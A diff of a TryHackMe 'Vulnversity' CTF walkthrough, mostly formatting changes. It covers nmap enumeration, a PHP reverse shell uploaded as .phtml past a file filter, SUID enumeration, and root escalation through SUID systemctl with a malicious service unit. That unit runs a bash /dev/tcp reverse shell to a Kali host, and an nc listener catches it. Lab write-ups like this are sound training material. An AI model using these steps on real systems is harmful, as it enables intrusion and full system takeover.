@@ -2,7 +2,7 @@
  Challenge link: https://tryhackme.com/room/vulnversity 
 ## IP
 10.10.198.229
-## Scans
+## Enumeration
 ### NMAP
 #### Command used:
 <code>$ nmap -sC -sV -Pn 10.10.198.229</code>
@@ -103,16 +103,16 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ## Exploitation
 ### BurpSuite 
-__ found a post request at internal/ __
-"""
+<u> found a post request at <i>/internal/</i> </u>
+
 Multiple file types seem to be blocked.
 Only '.phtml' seems to go through.
-"""
+
 #### Triggering payload
 """
 After a succesful upload of a php reverse shell masked with the required file type (aka .phtml) , we need to trigger the payload somehow.
 we can either use dirb / go buster in  recursive modes or manually poke around discovering <u>http://ip:3333/internal/uploads/payload_name.phtml</u>
-<b> Voila! a reverse shell on our listeners!</b>
+<b>Voila! a reverse shell on our listeners!</b>
 
 On enumerating the directories we can see the username is located at <code>/home/</code> which is the expected location. checking the dir we can see "user.txt" which contains the flag.
 """
@@ -121,7 +121,7 @@ On enumerating the directories we can see the username is located at <code>/home
 ##### Command used
 <code>find / -type f -perm -4000 2>/dev/null</code>
 ##### Results
-"""
+<pre>
 /usr/bin/newuidmap
 /usr/bin/chfn
 /usr/bin/newgidmap
@@ -148,10 +148,11 @@ On enumerating the directories we can see the username is located at <code>/home
 /bin/ping
 /bin/fusermount
 /sbin/mount.cifs
-"""
+</pre>
+
 ### LinPeas
 #### Intresting Observations
-"""  
+<pre>
 ╔══════════╣ CVEs Check
 Vulnerable to CVE-2021-4034    # Tough will not use this as this was not the targeted way.
 ══╣ PHP exec extensions
@@ -163,13 +164,13 @@ lrwxrwxrwx 1 root root 35 Jul 31  2019 /etc/apache2/sites-enabled/000-default.co
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid           
 ---sniped---   
 <b>-rwsr-xr-x 1 root root 645K Feb 13  2019 /bin/systemctl</b>
-
-"""
+---sniped---   
+</pre>
 
  
 ### Final Stretch (exploit Systemctl)
 #### Payload
-"""
+<pre>
 [Unit]
 Description=roooooooooot
 
@@ -180,17 +181,19 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9091 0>&1'
 
 [Install]
 WantedBy=multi-user.target
-"""
-"""
-After the files to a location that's writable (say /tmp) save it by a name say name.service
-then ran:
-##### On target
+</pre>
+
+After the files to a location that's writable (say /tmp) save it by a name say "name.service"
+
+then executed:
+##### On target (Vuln machine)
 <code>/bin/systemctl enable name.service</code>
 ##### On Kali
 <code>nc -nlvp 9091</code>
-##### On target
+##### On target (Vuln machine)
 <code>/bin/systemctl start name</code>
 
 <b>Voila! we have root's flag!</b>
-"""
+
+
 
